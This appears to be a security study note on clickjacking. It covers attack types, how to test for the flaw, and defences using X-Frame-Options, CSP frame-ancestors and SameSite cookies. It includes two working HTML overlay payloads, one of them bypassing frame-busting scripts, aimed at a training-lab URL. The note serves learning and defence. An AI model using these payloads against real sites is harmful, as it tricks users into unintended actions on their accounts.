# Clickjacking
---

## What Is Clickjacking?
Clickjacking is a type of attack that fools a user into clicking on one thing when the user is actually clicking on another thing

### Types Of Clickjacking
* <b>Likejacking</b>: This aims to grab user's clicks and redirect them to "likes" on  social media websites
* <b>Cookiejacking</b>: This involves getting a user to perform a set of actions interacting with the UI to provide the attacker with cookies stored in the browser
* <b>Filejacking</b>: This involves getting the user to allow the attacker to access their local file system and take files

### Impact Of Clickjacking Vulnerabilities
* Depends on the goal of the attacker .
    * **C**onfidentiality – Could be Low, Medium or High.
    * **I**ntegrity – Could be Low, Medium or High.
    * **A**vailability – Could be Low, Medium or High.

---

## How To Find Clickjacking Vulnerabilities?

Depends on the perspective of testing.

### Blackbox Testing
* Map the application
    * Visit all pages in the application and make note of all the response headers
        * Look for the X-Frame-Options and Content-Security-Policy response headers
* If X-Frame-Options header is set to "deny" or "sameorigin" that means the application is likely not vulnerable to clickjacking
* If the Content-Security-Policy header uses the directive frame-ancestors and that's set to "none" or "self", then the application is likely not vulnerable to clickjacking
    * If it contains domains, review any wildcard configuration
* Test identified instances of clickjacking vulnerabilities and develop a proof of concept

### Whitebox Testing
* Identify the framework that the application is using
    * Identify if the framework has built in defenses to prevent clickjacking vulnerabilities
    * Identify if any libraries have been imported to configure headers
* Review the set configuration to ensure that it is secure
* Test identified instances of clickjacking vulnerabilities and develop a proof of concept

---

## How To Exploit Clickjacking Vulnerabilities?

### Basic Clickjacking Attack

```javascript
<style>
    iframe{
        position:relative;
        width:1000px;
        height:1000px;
        opacity:0.00001;
        z-index:2;
    }
        div{
         position:absolute;
         top:515px;
         left:50px;
         z-index:1;
     }
</style>
    <div>Click Me</div>
    <iframe src="https://web-security-academy.net/my-account"></iframe>
```
### Bypassing Frame Busting Scripts
```javascript
<style>
    iframe{
        position:relative;
        width:1000px;
        height:1000px;
        opacity:0.00001;
        z-index:2;
    }
        div{
         position:absolute;
         top:515px;
         left:50px;
         z-index:1;
     }
</style>
    <div>Click Me</div>
    <iframe sandbox="allow-forms" src="https://web-security-academy.net/my-account"></iframe>
```

---

## How To Prevent Clickjacking Vulnerabilities?
There are three main mechanisms that can be used to defend against clickjacking attacks: 
* Defending with X-Frame-Options response header
* Defending with Content Security Policy (CSP) frame-ancestors directive
* Defending with SameSite cookies

#### X-Frame-Options
The **X-Frame-Options** HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a `<frame>` or `</iframe>`

There are three possible values for the X-Frame-Options header:
* DENY
`X-Frame-Options: deny`
* SAMEORIGIN
`X-Frame-Options: sameorigin`
* ALLOW_FROM origin
`X-Frame-Optiosn: allow-from https://legitimate-site.com`

This defense mechanism contains the following limitations: 
* This is a per-page policy specification
* The ALLOW-FROM option is obsolete and no longer works in modern browsers
* Multiple options are not supported

#### Content Security Policy (CSP)
The **Content-Security-Policy** HTTP response header allows website administrators to control resources the user agent is allowed to load for a given page

Use of CSP frame-ancestors:
* Prevent any domain from framing the content
`Content-Security-Policy: frame-ancestors 'none';`
* Only allow the current site to frame the content
`Content-Security-Policy: frame-ancestors 'self';`
* Allow multiple sites (specified) to frame the content
`Content-Security-Policy: frame-ancestors 'self' *.somesite.com https://site.com;`

This defense mechanism contains the following limitation: 
* CSP frame-ancestors is not supported by all the major browsers yet.

#### SameSite Cookies
The **SameSite** is a cookie attribute that determines when a website's cookies are included in requests originating from other domains.
It's usually used as a defense agains CSRF attacks.
* Strict
`Set-Cookie: session=aiuflha90$12FSDASd; SameSite = Strict`
* Lax
`Set-Cookie: session=aiuflha90$12FSDASd; SameSite = Lax`
The use of this attribute should be considered as part of defense-in-depth approach

This defense mechanism contains the following limitations: 
* If the clickjacking attack does not require the user to be authenticated, this defense mechanism will not work
* The SameSite attribute is suported by most browsers, however, there's a small number of browsers that do not support it

---

## Resources
* [Web Security Academy - Clickjacking (UI redressing)](https://portswigger.net/web-security/clickjacking)
* [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
* [OWASP WSTG – Testing for Clickjacking](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking)